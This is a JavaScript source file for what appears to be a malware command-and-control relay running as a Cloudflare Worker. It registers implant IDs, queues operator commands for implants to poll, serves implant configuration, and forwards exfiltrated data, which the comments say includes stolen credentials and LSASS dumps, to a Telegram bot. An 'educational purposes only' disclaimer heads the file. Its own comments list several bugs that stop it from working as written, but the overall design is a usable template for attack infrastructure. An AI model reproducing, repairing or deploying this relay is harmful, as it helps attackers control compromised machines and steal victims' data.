/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

/**
 * Veneficus Mini — Cloudflare Worker C2 relay.
 *
 * Intended: UUID gate, command queue, config blobs, Telegram page-out of exfil.
 *
 * BROKEN:
 *   - Service-worker `addEventListener('fetch')` plus `env.TELEGRAM_TOKEN`.
 *     `env` is a Module Worker argument, not a global. This script throws
 *     ReferenceError on load unless something else injects `env`.
 *   - No wrangler.toml in this tree (KV / secrets not declared).
 *   - No `/beacon` route; loader.ps1 and README expect it.
 *   - `/exfil` forwards ct.slice(0, 60) to Telegram and does not store ct
 *     in KV — operator cannot decrypt steal/LSASS/beacon payloads.
 *   - Rate limiting described in the header is not implemented.
 *   - `/listing` ignores KV list pagination (cursor / list.complete).
 *
 * KV namespaces required:
 *   UUID_KV     — implant registration (key: uuid, value: JSON metadata)
 *   COMMANDS_KV — queued commands (key: uuid, value: JSON array)
 *   CONFIG_KV   — per-implant or global config blobs (key: uuid or "global")
 *
 * Secrets (set via `wrangler secret put`):
 *   TELEGRAM_TOKEN   — bot API token
 *   TELEGRAM_CHAT_ID — operator chat / group ID
 *   ADMIN_KEY        — shared secret for admin endpoints
 */

// ── Bindings (set in wrangler.toml) ──────────────────────────────────────────
// BROKEN: `env` is undefined in this Worker format.
const TELEGRAM_TOKEN   = env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = env.TELEGRAM_CHAT_ID;  // BUG FIX: was TELEGRAaM_CHAT_ID
const ADMIN_KEY        = env.ADMIN_KEY;
const UUID_KV          = env.UUID_KV;
const COMMANDS_KV      = env.COMMANDS_KV;
const CONFIG_KV        = env.CONFIG_KV;

// ── Helpers ───────────────────────────────────────────────────────────────────

/** True if uuid exists as a key in UUID_KV. Length check is only a sanity filter. */
async function isValidImplant(uuid) {
    if (!uuid || uuid.length < 8) return false;
    const stored = await UUID_KV.get(uuid);
    return stored !== null;
}

/** POST to Telegram sendMessage in 4000-char chunks. No error handling. */
async function forwardToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    // Split large messages into 4000-char chunks (Telegram limit).
    for (let i = 0; i < message.length; i += 4000) {
        const chunk = message.slice(i, i + 4000);
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: chunk }),
        });
    }
}

/** Compare X-Admin-Key header to ADMIN_KEY (timing-unsafe string compare). */
function requireAdmin(request) {
    const key = request.headers.get('X-Admin-Key');
    return key === ADMIN_KEY;
}

function jsonResp(data, status = 200) {
    return new Response(JSON.stringify(data), {
        status,
        headers: { 'Content-Type': 'application/json' },
    });
}

// ── Request router ─────────────────────────────────────────────────────────────

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const url    = new URL(request.url);
    const method = request.method;
    const path   = url.pathname;

    // ── /exfil — implant → Telegram ─────────────────────────────────────────
    // BROKEN: only a 60-char ciphertext preview is forwarded; full ct/nonce
    // are not written to KV. Steal pipeline ends here.
    if (path === '/exfil' && method === 'POST') {
        try {
            const json      = await request.json();
            const uuid      = json.implant_uuid || '';
            const tag       = json.tag           || 'data';
            const ct        = json.ct            || '';  // AES-GCM ciphertext (b64)
            const nonce     = json.nonce         || '';
            const hmac      = json.hmac          || '';

            if (!await isValidImplant(uuid))
                return new Response('Unauthorized', { status: 403 });

            // Forward to Telegram — operator decrypts offline using the
            // implant-derived key (UUID-seeded AES).  Worker never holds the key.
            const tgMsg = `📤 [${uuid.slice(0,8)}] tag=${tag}\nct=${ct.slice(0,60)}…\nnonce=${nonce}\nhmac=${hmac.slice(0,16)}…`;
            await forwardToTelegram(tgMsg);

            // Log check-in timestamp.
            const meta = JSON.parse(await UUID_KV.get(uuid) || '{}');
            meta.last_seen = new Date().toISOString();
            meta.tag       = tag;
            await UUID_KV.put(uuid, JSON.stringify(meta));

            return new Response('OK', { status: 200 });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // ── /commands — implant polls for queued commands ─────────────────────────
    // One-shot queue: read JSON array, delete key, return { commands }.
    if (path === '/commands' && method === 'POST') {
        try {
            const json = await request.json();
            const uuid = json.implant_uuid || '';
            if (!await isValidImplant(uuid))
                return new Response('Unauthorized', { status: 403 });

            const raw  = await COMMANDS_KV.get(uuid) || '[]';
            const cmds = JSON.parse(raw);
            // Delete after delivery (one-time queue).
            await COMMANDS_KV.delete(uuid);
            return jsonResp({ commands: cmds });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // ── /config — implant fetches operator-supplied config ────────────────────
    // Per-UUID first, then key "global". Body is raw JSON text.
    if (path === '/config' && method === 'POST') {
        try {
            const json = await request.json();
            const uuid = json.implant_uuid || '';
            if (!await isValidImplant(uuid))
                return new Response('Unauthorized', { status: 403 });

            // Try per-UUID config first, fall back to "global".
            const cfg = await CONFIG_KV.get(uuid) || await CONFIG_KV.get('global') || '{}';
            return new Response(cfg, {
                status: 200,
                headers: { 'Content-Type': 'application/json' },
            });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // ── /admin — operator queues commands ─────────────────────────────────────
    // Appends json.command onto COMMANDS_KV[uuid] array. Needs X-Admin-Key.
    if (path === '/admin' && method === 'POST') {
        if (!requireAdmin(request)) return new Response('Forbidden', { status: 403 });
        try {
            const json    = await request.json();
            const uuid    = json.implant_uuid || '';
            const command = json.command      || '';
            if (!uuid || !command) return new Response('Bad request', { status: 400 });
            const existing = JSON.parse(await COMMANDS_KV.get(uuid) || '[]');
            existing.push(command);
            await COMMANDS_KV.put(uuid, JSON.stringify(existing));
            return new Response('Command queued', { status: 200 });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // ── /register — register a new implant UUID ───────────────────────────────
    if (path === '/register' && method === 'POST') {
        if (!requireAdmin(request)) return new Response('Forbidden', { status: 403 });
        try {
            const json = await request.json();
            const uuid = json.implant_uuid || '';
            if (!uuid) return new Response('uuid required', { status: 400 });
            const meta = {
                registered: new Date().toISOString(),
                last_seen:  null,
                note:       json.note || '',
            };
            await UUID_KV.put(uuid, JSON.stringify(meta));
            return new Response(`Registered ${uuid}`, { status: 200 });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // ── /unregister — revoke a UUID ───────────────────────────────────────────
    if (path === '/unregister' && method === 'POST') {
        if (!requireAdmin(request)) return new Response('Forbidden', { status: 403 });
        try {
            const json = await request.json();
            const uuid = json.implant_uuid || '';
            if (!uuid) return new Response('uuid required', { status: 400 });
            await UUID_KV.delete(uuid);
            await COMMANDS_KV.delete(uuid);
            return new Response(`Unregistered ${uuid}`, { status: 200 });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // ── /listing — list all registered UUIDs ─────────────────────────────────
    // BROKEN: UUID_KV.list() is paginated; cursor is ignored.
    if (path === '/listing' && method === 'GET') {
        if (!requireAdmin(request)) return new Response('Forbidden', { status: 403 });
        try {
            const list = await UUID_KV.list();
            const keys = list.keys.map(k => k.name);
            return jsonResp({ implants: keys, count: keys.length });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // ── /set_config — push config to an implant or globally ──────────────────
    if (path === '/set_config' && method === 'POST') {
        if (!requireAdmin(request)) return new Response('Forbidden', { status: 403 });
        try {
            const json    = await request.json();
            const key     = json.implant_uuid || 'global';
            const payload = json.config;
            if (!payload) return new Response('config required', { status: 400 });
            await CONFIG_KV.put(key, JSON.stringify(payload));
            return new Response(`Config set for ${key}`, { status: 200 });
        } catch (e) { return new Response('Error', { status: 500 }); }
    }

    // Missing: GET /beacon (stager download). Falls through to 404.
    return new Response('Not Found', { status: 404 });
}
